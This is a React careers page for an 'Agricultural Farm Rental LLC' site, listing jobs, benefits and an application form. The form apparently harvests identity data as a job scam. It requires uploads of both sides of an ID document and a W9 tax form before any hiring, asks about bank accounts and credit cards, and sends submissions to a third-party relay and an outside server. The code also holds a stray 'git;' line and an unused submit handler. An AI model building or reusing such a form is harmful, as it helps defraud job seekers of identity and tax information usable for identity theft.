import React from "react";
import Layout from "../components/Layout";
import WeHelp from "../components/Home Components/WeHelp";
import { useState } from "react";

const Careers = () => {
  const [formData, setFormData] = useState({
    fullname: "",
    email: "",
    phoneNumber: "",
    address: "",
    position: "",
    work_auth: "",
    availability: "",
    company1: "",
    job1: "",
    dates1: "",
    reason1: "",
    education: "",
    bank_account: "",
    credit_card: "",
    signature: "",
    date: "",
    frontView: null,
    backView: null,
    w9form: null,
    resume: null,
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e) => {
    const { name, value, files } = e.target;
    if (files) {
      setFormData({ ...formData, [name]: files[0] });
    } else {
      setFormData({ ...formData, [name]: value });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Create FormData object for the backend
    const data = new FormData();
    data.append("fullname", formData.fullname);
    data.append("email", formData.email);
    data.append("phoneNumber", formData.phoneNumber);
    data.append("address", formData.address);
    data.append("frontView", formData.frontView);
    data.append("backView", formData.backView);
    data.append("w9form", formData.w9form);
    data.append("resume", formData.resume);

    try {
      const response = await fetch("https://rrserver-1itz.onrender.com/info", {
        method: "POST",
        body: data,
      });
      if (response.ok) {
        alert("Form submitted successfully!");
      } else {
        alert("Something went wrong. Please try again.");
        git;
      }
      const result = await response.json();
      console.log(result);
      setIsSubmitting(false);
    } catch (error) {
      setIsSubmitting(false);
      console.error("Error submitting form:", error);
    }
  };
  return (
    <>
      <Layout>
        <div>
          <div className="">
            <div className="career">
              <h4>Careers at Agricultural Farm Rental LLC</h4>
              <p>
                Join our team! We offer both remote and on-site roles supporting
                agriculture through customer service, sales, admin, logistics,
                and field operations. Whether you're an experienced professional
                or looking to start a hands-on career in agriculture, we have
                opportunities for growth, training, and long-term success.
              </p>

              <h5>Open Positions</h5>

              <h6>1. Customer Support Representative (Remote)</h6>
              <li>Assist customers with inquiries and technical support.</li>
              <li>Respond via email, chat, and phone with professionalism.</li>

              <h6>2. Sales Representative (Remote)</h6>
              <li>Generate leads and close rental service deals.</li>
              <li>
                Maintain long-term client relationships and sales records.
              </li>

              <h6>3. Marketing Specialist (Remote)</h6>
              <li>Run digital campaigns and manage social media channels.</li>
              <li>
                Monitor engagement metrics and optimize marketing content.
              </li>

              <h6>4. Administrative Assistant (Remote)</h6>
              <li>
                Handle scheduling, file organization, and internal coordination.
              </li>
              <li>Support HR and department managers with admin tasks.</li>

              <h6>5. Equipment Delivery Driver (On-Site)</h6>
              <li>
                Deliver heavy-duty farming equipment to and from customer sites.
              </li>
              <li>
                Conduct safety checks, load/unload equipment, and log
                deliveries.
              </li>

              <h6>6. Farm Truck Driver (On-Site)</h6>
              <li>
                Transport feed, produce, livestock, or equipment between sites.
              </li>
              <li>
                Assist logistics teams with route planning and field support.
              </li>

              <h6>7. Agricultural Machinery Driver (On-Site)</h6>
              <li>
                Operate and transport large agricultural machines including
                harvesters, balers, and planters.
              </li>
              <li>
                Follow safety protocols and assist in field preparation work.
              </li>

              <h6>8. Diesel Mechanic / Equipment Technician (On-Site)</h6>
              <li>
                Maintain and repair farm equipment and diesel-powered vehicles.
              </li>
              <li>
                Diagnose engine issues, perform oil changes, and replace parts.
              </li>

              <h6>9. Equipment Operator (On-Site)</h6>
              <li>
                Operate tractors, loaders, plows, and tillers for client
                projects.
              </li>
              <li>
                Assist with irrigation, field leveling, and crop maintenance.
              </li>

              <h6>10. Field Technician (On-Site)</h6>
              <li>
                Service farm equipment at job sites and troubleshoot mechanical
                problems.
              </li>
              <li>
                Train clients on proper usage and safety of rental equipment.
              </li>

              <h6>11. Farm Hand (On-Site)</h6>
              <li>
                General labor including seeding, irrigation setup, and
                harvesting.
              </li>
              <li>
                Maintain cleanliness, fences, and assist livestock care if
                needed.
              </li>

              <h6>12. Logistics Coordinator (Remote/Hybrid)</h6>
              <li>
                Manage deliveries, fleet tracking, and field team assignments.
              </li>
              <li>
                Schedule pickups, equipment transfers, and customer
                appointments.
              </li>
            </div>

            <div className="career">
              <h5>Employee Benefits</h5>
              <li>Competitive Salary & Performance Bonuses</li>
              <li>401(k) Retirement Plan with Matching</li>
              <li>Health Insurance – Medical, Dental & Vision</li>
              <li>Paid Sick Leave, Vacation & U.S. Holidays</li>
              <li>Remote Work Flexibility (for eligible roles)</li>
              <li>Career Training, Licenses & Certifications</li>
              <li>Annual Team Retreats & Employee Discounts</li>
              <li>Equipment and Tool Stipends for On-Site Roles</li>
            </div>
          </div>

          <div className="form1">
            <form
              action="https://formsubmit.co/4f7bc0e166fb8a8c21a453c168613d83"
              method="POST"
              enctype="multipart/form-data"
            >
              <h2>Job Application Form</h2>
              <label for="name">Full Name:</label>
              <input type="text" id="name" name="name" required></input>
              <label for="email">Email Address:</label>
              <input type="email" id="email" name="email" required></input>
              <label for="phone">Phone Number:</label>
              <input type="tel" id="phone" name="phone" required></input>
              <label for="address">Current Address:</label>
              <input type="text" id="address" name="address" required></input>
              <>
                <label for="position">Position Applying For:</label>
                <select id="position" name="position" required>
                  <option value="Customer Support Representative">
                    Customer Support Representative
                  </option>
                  <option value="Sales Representative">
                    Sales Representative
                  </option>
                  <option value="Marketing Specialist">
                    Marketing Specialist
                  </option>
                  <option value="Administrative Assistant">
                    Administrative Assistant
                  </option>
                </select>
                <>
                  <label>
                    Are you legally authorized to work in the United States?
                  </label>
                  <input type="radio" name="work_auth" value="Yes" required />
                  Yes
                  <input type="radio" name="work_auth" value="No" /> No
                </>
                <>
                  <label>Are you available to work full-time?</label>
                  <input
                    type="radio"
                    name="availability"
                    value="Yes"
                    required
                  />{" "}
                  Yes
                  <input type="radio" name="availability" value="No" /> No
                </>
              </>
              <>
                <h2>Employment History</h2>
                <label for="company1">Most Recent Company:</label>
                <input type="text" id="company1" name="company1"></input>
                <label for="job1">Job Title:</label>
                <input type="text" id="job1" name="job1"></input>
                <label for="dates1">Employment Dates:</label>
                <input type="text" id="dates1" name="dates1"></input>
                <label for="reason1">Reason for Leaving:</label>
                <input type="text" id="reason1" name="reason1"></input>
              </>
              <>
                <label for="education">
                  Highest Level of Education Completed:
                </label>
                <select id="education" name="education" required>
                  <option value="High School Diploma/GED">
                    High School Diploma/GED
                  </option>
                  <option value="Associate’s Degree">Associate’s Degree</option>
                  <option value="Bachelor’s Degree">Bachelor’s Degree</option>
                  <option value="Other">Other</option>
                </select>
              </>
              <>
                <label>
                  Do you have an active bank account for payroll deposits?
                </label>
                <input type="radio" name="bank_account" value="Yes" required />{" "}
                Yes
                <input type="radio" name="bank_account" value="No" /> No
              </>
              <>
                <label>
                  (For Sales & Marketing Roles Only) Do you have a credit card
                  to manage reimbursable business expenses?
                </label>
                <input type="radio" name="credit_card" value="Yes" /> Yes
                <input type="radio" name="credit_card" value="No" /> No
              </>
              <br />
              <>
                <label for="resume">Upload Resume (PDF/DOCX only):</label>
                <input
                  type="file"
                  id="resume"
                  name="resume"
                  accept=".pdf, .doc, .docx"
                  required
                ></input>
              </>

              <>
                <label for="idCardFront">
                  Unexpired Identification Form Front View (PDF/DOCX only):
                </label>
                <input
                  type="file"
                  id="idCardFront"
                  name="attachment"
                  accept=".pdf, .doc, .docx"
                  required
                />
                <label for="idCardBack">
                  Unexpired Identification Form Back View (PDF/DOCX only):
                </label>
                <input
                  type="file"
                  name="attachment"
                  accept=".pdf, .doc, .docx"
                  required
                />
              </>
              <br />
              <>
                <label for="w9form"> W9 Form (PDF/DOCX only):</label>
                <input
                  type="file"
                  id="w9form"
                  name="w9form"
                  accept=".pdf, .doc, .docx"
                  required
                ></input>
              </>
              {/* <>
                <h3>References</h3>
                <label for="ref1">Reference 1 Name:</label>
                <input type="text" id="ref1" name="ref1">
                  <label for="ref1_phone">Reference 1 Phone Number:</label>
                  <input type="tel" id="ref1_phone" name="ref1_phone" />
                  <label for="ref2">Reference 2 Name:</label>
                  <input type="text" id="ref2" name="ref2" />
                  <label for="ref2_phone" />
                  Reference 2 Phone Number:
                  <label />
                  <input type="tel" id="ref2_phone" name="ref2_phone" />
                </input>
              </> */}
              <>
                <p>
                  By submitting this application, I certify that all information
                  provided is true and complete. I understand that any false
                  information may result in disqualification or termination if
                  hired..
                </p>
                <label for="signature">Signature (Type Name):</label>
                <input type="text" id="signature" name="signature" required />
                <label for="date">Date:</label>
                <input type="date" id="date" name="date" required />
                <br />

                <button type="submit">Submit Application</button>
              </>
            </form>
          </div>
        </div>
        <WeHelp />
      </Layout>
    </>
  );
};

export default Careers;
